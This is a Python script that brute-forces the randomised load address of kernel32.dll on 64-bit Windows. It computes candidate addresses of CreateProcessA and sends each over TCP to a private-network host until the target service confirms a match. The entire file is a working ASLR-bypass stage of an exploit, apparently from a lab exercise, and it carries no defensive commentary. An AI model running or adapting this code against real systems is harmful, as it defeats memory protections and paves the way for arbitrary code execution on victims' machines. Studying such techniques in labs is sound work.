import socket
import struct
import pefile
import time

def get_size_of_image(dll_path):
    # SizeOfImage - the size of the contiguous memory that needs to be reserved 
    # to load the file in memory
    pe = pefile.PE(dll_path)
    return pe.OPTIONAL_HEADER.SizeOfImage

PORT = 27016
BITS_ENTROPY_64DLL = 19
MAX_64BIT_USERLAND_ADDR = 1 << 63 # aka 0x8000000000000000

create_processa_offset = 0x1c100
size_of_image = get_size_of_image("C:\\Windows\\System32\\kernel32.dll")
max_base_addr_dll = 2**BITS_ENTROPY_64DLL

i = 1

for base_address in range(1, max_base_addr_dll):
    base_address = (0xFFF << 35) + (base_address << 16) # bits 35-63 are always constant
    if (base_address + size_of_image) >= (MAX_64BIT_USERLAND_ADDR): # pointer can't get larger than userland address space
        break
    final_addr = base_address + create_processa_offset # calculating address of CreateProcessA
    print("Attempt %d. Trying 0x%lx" % (i, final_addr))

    value = struct.pack("<Q", final_addr)
    host = "192.168.224.130"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            s.connect((host, PORT))
            break
        except Exception as e:
            if e.errno == 10061: # connection refused, port is not yet open
                continue
    s.send(value)
    res = s.recv(16)
    if res == "Correct":
        print("Correct address is 0x%x" % final_addr)
        s.close()
    i += 1